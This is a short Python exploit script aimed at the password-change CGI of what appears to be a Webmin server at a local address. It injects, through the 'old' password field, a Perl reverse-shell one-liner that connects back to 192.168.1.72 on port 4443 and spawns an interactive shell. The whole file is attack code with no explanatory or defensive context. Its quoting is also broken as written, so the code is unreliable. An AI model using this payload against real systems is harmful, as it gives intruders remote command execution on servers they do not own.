import requests

url = "https://192.168.1.14:10000/password_change.cgi"

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
    "Referer": "https://192.168.1.14:10000/session_login.cgi",
    "Content-Type": "application/x-www-form-urlencoded",
}

data = "user=rootxx&pam=&expired=2&old=test|perl -e 'use Socket;$i=\"192.168.1.72"\";$p="4443";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'&new1=test2&new2=test2"

response = requests.post(url, headers=headers, data=data, verify=False)

print(response.text)
